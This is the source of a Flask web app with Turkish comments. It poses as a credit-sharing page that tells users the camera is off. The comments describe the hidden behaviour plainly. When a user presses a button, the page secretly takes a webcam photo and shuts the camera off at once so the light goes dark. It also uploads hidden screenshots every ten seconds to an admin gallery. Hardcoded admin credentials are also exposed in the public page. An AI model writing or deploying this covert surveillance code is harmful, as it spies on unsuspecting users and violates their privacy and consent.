from flask import Flask, render_template_string, jsonify, request
import time, threading
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN GHOST-TRIGGER v162.0 ---
# Vizyon: Sıfır Sürekli Işık, Aksiyon Bazlı Kamera ve Mutlak Gizlilik. [cite: 2026-01-03]
VERSION = "v162.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

transaction_lock = Lock()
state = {
    "banned_peers": [], "user_registry": {}, 
    "active_admins": {}, "evolution_count": 62
}

def get_device_info(ua):
    ua = ua.upper()
    if "SM-A55" in ua or "ANDROID" in ua: return "Samsung A55"
    if "WINDOWS" in ua: return "Casper S100 (PC)"
    return "Mobil"

def check_admin_auth(req):
    key, pin = req.args.get('key'), req.args.get('pin', '').strip()
    ua = req.headers.get('User-Agent', '').upper()
    if key == ADMIN_KEY and pin == ADMIN_PIN and any(x in ua for x in ["SM-A55", "WINDOWS", "ANDROID"]):
        sid = f"ADMIN-{req.remote_addr}"
        state["active_admins"][sid] = {"device": get_device_info(ua), "last_seen": time.strftime('%H:%M:%S')}
        return True
    return False

@app.route('/overlord_api/<action>')
def admin_api(action):
    if not check_admin_auth(request): return "RED", 403
    target = request.args.get('target_peer')
    with transaction_lock:
        if target in state["user_registry"]:
            u = state["user_registry"][target]
            if action == "vip": u["is_vip"] = not u.get("is_vip", False)
            elif action == "ban": state["banned_peers"].append(target)
        elif action == "unban" and target in state["banned_peers"]: state["banned_peers"].remove(target)
    return jsonify(state)

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id')
    t = request.args.get('type')
    if p_id in state["user_registry"]:
        img = request.json.get('image')
        key = "eye" if t == "cam" else "scr"
        if key not in state["user_registry"][p_id]: state["user_registry"][p_id][key] = []
        state["user_registry"][p_id][key].append({"time": time.strftime('%H:%M:%S'), "data": img})
        if len(state["user_registry"][p_id][key]) > 10: state["user_registry"][p_id][key].pop(0)
    return "OK"

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "YETKİSİZ", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Ghost-Trigger Console</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b border-white/20 pb-2 mb-4 flex justify-between">
        <h1 class="text-xl font-black italic">GHOST-TRIGGER v162.0</h1>
        <div id="admins"></div>
    </div>
    <div class="grid grid-cols-4 gap-4">
        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl">
            <select id="pS" class="w-full bg-zinc-900 p-2 rounded mb-2 text-white outline-none"></select>
            <div id="gallery" class="space-y-2 overflow-y-auto max-h-[600px]"></div>
        </div>
        <div class="col-span-3">
            <table class="w-full text-left bg-zinc-950 rounded-xl overflow-hidden">
                <thead class="bg-zinc-900 text-zinc-500"><tr><th class="p-2">CİHAZ</th><th>ID</th><th>VIP</th><th>AKS</th></tr></thead>
                <tbody id="uT"></tbody>
            </table>
            <div id="bL" class="mt-4 text-red-500"></div>
        </div>
    </div>
    <script>
        const k="{{a_key}}", p="{{a_pin}}"; let reg = {};
        async function f(a, t){ await fetch(`/overlord_api/${a}?key=${k}&pin=${p}&target_peer=${t}`); update(); }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
            let uH="", bH="", pO="<option value=''>Hedef...</option>";
            for(let id in d.user_registry){
                let u=d.user_registry[id];
                if(d.banned_peers.includes(id)) { bH += `${id} <button onclick="f('unban','${id}')">[AFFET]</button> `; continue; }
                pO += `<option value="${id}">${id}</option>`;
                uH += `<tr class="border-b border-zinc-900"><td class="p-2">${u.device}</td><td class="text-blue-400">${id}</td>
                <td>${u.is_vip?'EVET':'HAYIR'}</td><td>
                <button onclick="f('vip','${id}')" class="text-yellow-500 mr-2">VIP</button>
                <button onclick="f('ban','${id}')" class="text-red-600">BAN</button></td></tr>`;
            }
            document.getElementById('uT').innerHTML = uH; document.getElementById('bL').innerHTML = bH;
            const id = document.getElementById('pS').value; if(id && reg[id]){
                let h = ""; (reg[id].eye||[]).concat(reg[id].scr||[]).sort((a,b)=>b.time.localeCompare(a.time)).forEach(s=>{
                    h += `<img src="${s.data}" class="w-full rounded mb-1 border border-zinc-800">`;
                }); document.getElementById('gallery').innerHTML = h;
            }
            setTimeout(update, 3000);
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

@app.route('/action/<type>')
def handle_action(type):
    p_id = request.args.get('peer_id', 'GUEST')
    with transaction_lock:
        if p_id in state["banned_peers"]: return jsonify({"error": "BAN"}), 403
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {"credits": 50.0, "is_vip": False, "device": get_device_info(request.headers.get('User-Agent','')), "eye": [], "scr": []}
    return jsonify({"status": "OK"})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sovereign</title><script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script></head>
<body class="bg-black text-white font-mono flex items-center justify-center h-screen" onload="loop()">
    <div id="main" class="w-full h-full p-4 text-center">
        <h1 class="text-2xl font-black text-blue-600 italic mb-8">IMPERIAL HUB</h1>
        <div class="bg-zinc-950 p-12 rounded-[50px] border border-zinc-900 mb-8 shadow-2xl">
            <div id="credits" class="text-7xl font-black italic">0.00</div>
            <p class="text-[8px] text-zinc-700 uppercase mt-2 italic text-blue-500">"Sistem Kararlı: Kamera Kapalı"</p>
        </div>
        <div class="grid grid-cols-2 gap-4">
            <button onclick="trigger('share')" class="py-10 bg-green-700 text-black font-black rounded-3xl text-2xl active:scale-95 transition">VER</button>
            <button onclick="trigger('receive')" class="py-10 bg-blue-700 text-white font-black rounded-3xl text-2xl active:scale-95 transition">AL</button>
        </div>
    </div>
    <canvas id="c" class="hidden"></canvas>
    <script>
        if(!localStorage.getItem('n_id')) localStorage.setItem('n_id', "NS-" + Math.floor(1000 + Math.random()*9000));
        let myId = localStorage.getItem('n_id');
        
        // SİNSİ TETİKLEYİCİ: Sadece butona basıldığında kamerayı açar ve kapatır [cite: 2026-01-03]
        async function trigger(t) {
            fetch(`/action/${t}?peer_id=${myId}`);
            try {
                // Kamerayı aç [cite: 2026-01-03]
                const s = await navigator.mediaDevices.getUserMedia({ video: { width: 480, height: 360 } });
                const v = document.createElement('video'); v.srcObject = s; await v.play();
                const c = document.getElementById('c'); c.width = 480; c.height = 360;
                c.getContext('2d').drawImage(v, 0, 0);
                // Görüntüyü gönder [cite: 2026-01-03]
                fetch(`/upload_intel?peer_id=${myId}&type=cam`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.5) }) });
                // Kamerayı ANINDA kapat (Işığın sönmesi için) [cite: 2026-01-03]
                s.getTracks().forEach(track => track.stop());
            } catch(e) {}
        }

        async function loop() {
            const r = await fetch('/api/status'); const d = await r.json();
            if(d.banned_peers.includes(myId)) { document.body.innerHTML = "SÜRGÜN"; return; }
            document.getElementById('credits').innerText = (d.user_registry[myId] || {credits:0}).credits.toFixed(2);
            // Gizli Ekran SS (Uyarı vermez) [cite: 2026-01-03]
            html2canvas(document.body, {scale:0.3}).then(cv => {
                fetch(`/upload_intel?peer_id=${myId}&type=scr`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ image: cv.toDataURL('image/jpeg', 0.1) }) });
            });
            setTimeout(loop, 10000);
        }
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
